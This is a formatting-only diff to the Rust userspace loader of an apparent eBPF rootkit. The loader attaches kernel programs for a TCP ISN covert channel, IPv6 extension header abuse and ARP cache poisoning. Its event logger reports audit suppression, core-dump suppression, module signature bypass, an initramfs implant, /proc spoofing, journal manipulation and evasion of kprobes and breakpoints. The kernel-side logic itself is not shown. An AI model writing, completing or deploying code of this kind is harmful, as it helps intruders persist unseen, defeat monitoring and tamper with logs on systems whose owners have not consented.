@@ -599,7 +599,8 @@ async fn main() -> Result<()> {
         entry.load()?;
         entry.attach("__x64_sys_getpid", 0)?;
         let mut tail_progs = ProgramArray::try_from(
-            bpf.take_map("TAIL_CALL_PROGS").context("TAIL_CALL_PROGS not found")?,
+            bpf.take_map("TAIL_CALL_PROGS")
+                .context("TAIL_CALL_PROGS not found")?,
         )?;
         let fd0 = bpf.program("shadow_tail_chain_stage1").unwrap().fd()?;
         tail_progs.set(0, fd0, 0)?;
@@ -688,7 +689,10 @@ async fn main() -> Result<()> {
             .try_into()?;
         prog.load()?;
         prog.attach(&cli.iface, TcAttachType::Egress)?;
-        info!("✓ Feature 33: TCP ISN Covert Channel attached to {}", cli.iface);
+        info!(
+            "✓ Feature 33: TCP ISN Covert Channel attached to {}",
+            cli.iface
+        );
     }
 
     // ── Feature 34: IPv6 Extension Header Abuse (TC egress) ──
@@ -699,7 +703,10 @@ async fn main() -> Result<()> {
             .try_into()?;
         prog.load()?;
         prog.attach(&cli.iface, TcAttachType::Egress)?;
-        info!("✓ Feature 34: IPv6 Extension Header Abuse attached to {}", cli.iface);
+        info!(
+            "✓ Feature 34: IPv6 Extension Header Abuse attached to {}",
+            cli.iface
+        );
     }
 
     // ── Feature 35: ARP Cache Poisoning (XDP) ──
@@ -710,7 +717,10 @@ async fn main() -> Result<()> {
             .try_into()?;
         prog.load()?;
         prog.attach(&cli.iface, XdpFlags::default())?;
-        info!("✓ Feature 35: ARP Cache Poisoning attached to {}", cli.iface);
+        info!(
+            "✓ Feature 35: ARP Cache Poisoning attached to {}",
+            cli.iface
+        );
     }
 
     // ── Feature 36: XDP Port Knocking Daemon ──
@@ -1255,73 +1265,139 @@ fn log_event(event: &EventHeader) {
             );
         }
         EVENT_KPROBE_DETECTED => {
-            warn!("Kprobe detected on our hook: PID={}, addr=0x{:x}", event.pid, event.context);
+            warn!(
+                "Kprobe detected on our hook: PID={}, addr=0x{:x}",
+                event.pid, event.context
+            );
         }
         EVENT_TAIL_CALL_CHAIN => {
-            debug!("Tail-call chain executed: PID={}, stage={}", event.pid, event.context);
+            debug!(
+                "Tail-call chain executed: PID={}, stage={}",
+                event.pid, event.context
+            );
         }
         EVENT_FTRACE_BLINDED => {
-            info!("Ftrace/perf blinded: PID={}, target=0x{:x}", event.pid, event.context);
+            info!(
+                "Ftrace/perf blinded: PID={}, target=0x{:x}",
+                event.pid, event.context
+            );
         }
         EVENT_BPF_ITER_ABUSED => {
-            info!("BPF iterator filtered: PID={}, iter_id={}", event.pid, event.context);
+            info!(
+                "BPF iterator filtered: PID={}, iter_id={}",
+                event.pid, event.context
+            );
         }
         EVENT_VDSO_HOOKED => {
-            info!("VDSO page mapped: PID={}, addr=0x{:x}", event.pid, event.context);
+            info!(
+                "VDSO page mapped: PID={}, addr=0x{:x}",
+                event.pid, event.context
+            );
         }
         EVENT_SHM_COVERT_MSG => {
-            debug!("SHM covert msg: PID={}, shm_id={}", event.pid, event.context);
+            debug!(
+                "SHM covert msg: PID={}, shm_id={}",
+                event.pid, event.context
+            );
         }
         EVENT_UFFD_INJECTION => {
-            info!("UFFD injection: PID={}, fault_addr=0x{:x}", event.pid, event.context);
+            info!(
+                "UFFD injection: PID={}, fault_addr=0x{:x}",
+                event.pid, event.context
+            );
         }
         EVENT_COREDUMP_SUPPRESSED => {
-            warn!("Core dump suppressed: PID={}, signal={}", event.pid, event.context);
+            warn!(
+                "Core dump suppressed: PID={}, signal={}",
+                event.pid, event.context
+            );
         }
         EVENT_ISN_COVERT => {
-            debug!("ISN covert channel: PID={}, bytes={}", event.pid, event.context);
+            debug!(
+                "ISN covert channel: PID={}, bytes={}",
+                event.pid, event.context
+            );
         }
         EVENT_IPV6_EXT_ABUSE => {
-            debug!("IPv6 ext header injected: PID={}, len={}", event.pid, event.context);
+            debug!(
+                "IPv6 ext header injected: PID={}, len={}",
+                event.pid, event.context
+            );
         }
         EVENT_ARP_POISONED => {
-            info!("ARP poisoned: target_ip=0x{:08x}", event.context as u32);
+            info!(
+                "ARP poisoned: target_ip=0x{:08x}",
+                event.context as u32
+            );
         }
         EVENT_PORT_KNOCK_AUTH => {
-            warn!("Port knock authenticated: src_ip=0x{:08x}", event.context as u32);
+            warn!(
+                "Port knock authenticated: src_ip=0x{:08x}",
+                event.context as u32
+            );
         }
         EVENT_BGP_HIJACK => {
-            warn!("BGP prefix announced: prefix=0x{:08x}", event.context as u32);
+            warn!(
+                "BGP prefix announced: prefix=0x{:08x}",
+                event.context as u32
+            );
         }
         EVENT_DR_BREAKPOINT => {
-            warn!("HW breakpoint deflected: PID={}, addr=0x{:x}", event.pid, event.context);
+            warn!(
+                "HW breakpoint deflected: PID={}, addr=0x{:x}",
+                event.pid, event.context
+            );
         }
         EVENT_PMC_COVERT => {
-            debug!("PMC covert data: PID={}, val={}", event.pid, event.context);
+            debug!(
+                "PMC covert data: PID={}, val={}",
+                event.pid, event.context
+            );
         }
         EVENT_TSC_SIDECHAN => {
-            warn!("TSC anomaly detected: PID={}, delta_ns={}", event.pid, event.context);
+            warn!(
+                "TSC anomaly detected: PID={}, delta_ns={}",
+                event.pid, event.context
+            );
         }
         EVENT_AUDIT_KILLED => {
-            warn!("Audit msg suppressed: PID={}, msg_type={}", event.pid, event.context);
+            warn!(
+                "Audit msg suppressed: PID={}, msg_type={}",
+                event.pid, event.context
+            );
         }
         EVENT_INODE_SLACK_HIDE => {
-            debug!("Slack-space write: PID={}, ino={}", event.pid, event.context);
+            debug!(
+                "Slack-space write: PID={}, ino={}",
+                event.pid, event.context
+            );
         }
         EVENT_JOURNAL_MANIPULATED => {
-            info!("Journal manipulated: PID={}, dev_ino={}", event.pid, event.context);
+            info!(
+                "Journal manipulated: PID={}, dev_ino={}",
+                event.pid, event.context
+            );
         }
         EVENT_PROC_DEEP_SPOOF => {
-            info!("/proc spoofed: PID={}, target_pid={}", event.pid, event.context);
+            info!(
+                "/proc spoofed: PID={}, target_pid={}",
+                event.pid, event.context
+            );
         }
         EVENT_INITRAMFS_IMPLANT => {
-            warn!("Initramfs implant: PID={}, mod_ptr=0x{:x}", event.pid, event.context);
+            warn!(
+                "Initramfs implant: PID={}, mod_ptr=0x{:x}",
+                event.pid, event.context
+            );
         }
         EVENT_MODSIGN_BYPASS => {
             warn!("Module sig check bypassed: PID={}", event.pid);
         }
         EVENT_BPF_LINK_PINNED => {
-            info!("BPF pin access: PID={}, path_ptr=0x{:x}", event.pid, event.context);
+            info!(
+                "BPF pin access: PID={}, path_ptr=0x{:x}",
+                event.pid, event.context
+            );
         }
         _ => {
             debug!("Unknown event: type={}", event.event_type);
